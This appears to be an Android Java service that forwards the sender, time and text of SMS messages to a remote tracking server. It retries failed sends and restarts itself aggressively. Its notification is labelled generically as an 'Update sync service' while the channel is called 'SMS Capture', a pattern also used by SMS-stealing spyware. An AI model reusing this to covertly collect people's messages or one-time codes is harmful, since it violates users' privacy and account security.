package com.example.VenLit;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.PowerManager;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.work.Constraints;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class SmsService extends Service {
    public static final String PREFS_NAME ="ServicePrefs" ;
    public static final String KEY_LAST_ACTIVE = "lastActive";
    private Retrofit retrofit;
    private PowerManager.WakeLock wakeLock;
    private SmsQueueManager smsQueueManager;

    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "SmsService:SyncLock"
        );
//           .baseUrl("https://backuptrack.salumtransports.co.tz/")
        //.baseUrl("https://dawillygene.co.tz/apk_gene/")
        retrofit = new Retrofit.Builder()
                .baseUrl("https://backuptrack.salumtransports.co.tz/")
                .addConverterFactory(GsonConverterFactory.create())
                .build();
        smsQueueManager = new SmsQueueManager(this);
        CheckServiceJobService.scheduleJob(this);
        scheduleServiceRestart(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = createNotification();
        startForeground(NOTIFICATION_ID, notification);

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit().putLong(KEY_LAST_ACTIVE, System.currentTimeMillis()).apply();


        if (intent != null && ACTION_SEND_SMS.equals(intent.getAction())) {
            String sender = intent.getStringExtra(EXTRA_SENDER);
            long timestamp = intent.getLongExtra(EXTRA_TIMESTAMP, 0L);
            String message = intent.getStringExtra(EXTRA_MESSAGE);
            sendMessage(sender, timestamp, message);
        }


        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void sendMessage(String sender, long timestamp, String message) {
        if (sender == null || message == null) return;

        if (!wakeLock.isHeld()) {
            wakeLock.acquire(60 * 1000L); // Hold lock for 60 seconds
        }

        SmsData smsData = new SmsData(sender, timestamp, message);
        SmsApi api = retrofit.create(SmsApi.class);
        Call<SmsResponse> call = api.sendSms(smsData);
        call.enqueue(new Callback<SmsResponse>() {
            @Override
            public void onResponse(@NonNull Call<SmsResponse> call, @NonNull Response<SmsResponse> response) {
                releaseWakeLock();
            }

            @Override
            public void onFailure(@NonNull Call<SmsResponse> call, @NonNull Throwable t) {
                smsQueueManager.enqueueSms(smsData);
                releaseWakeLock();
                enqueueResendWorker();
            }
        });
    }

    private void enqueueResendWorker() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
                .build();

        OneTimeWorkRequest workRequest = new OneTimeWorkRequest.Builder(ResendSmsWorker.class)
                .setConstraints(constraints)
                .build();

        WorkManager.getInstance(getApplicationContext())
                .enqueueUniqueWork("ResendSmsWork",
                        androidx.work.ExistingWorkPolicy.KEEP,
                        workRequest);
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        onStartCommand(null, 0, 0);
        releaseWakeLock();
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Android Service")
                .setContentText("Update sync service")
                .setSmallIcon(R.drawable.ic_launcher_background)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
        );
        ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE))
                .createNotificationChannel(channel);
    }

    private void scheduleServiceRestart(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, SmsService.class);
        PendingIntent pendingIntent = PendingIntent.getService(context, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        long interval = 3 * 60 * 1000; // 15 minutes
        long triggerTime = System.currentTimeMillis() + interval;

        if (alarmManager != null) {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
        }
    }


    public static final String CHANNEL_ID = "sms-service-channel";
    public static final String CHANNEL_NAME = "SMS Capture";
    public static final int NOTIFICATION_ID = 1;
    public static final String ACTION_SEND_SMS = "com.example.smsservice.SEND_SMS";
    public static final String EXTRA_SENDER = "sender";
    public static final String EXTRA_TIMESTAMP = "timestamp";
    public static final String EXTRA_MESSAGE = "message";
}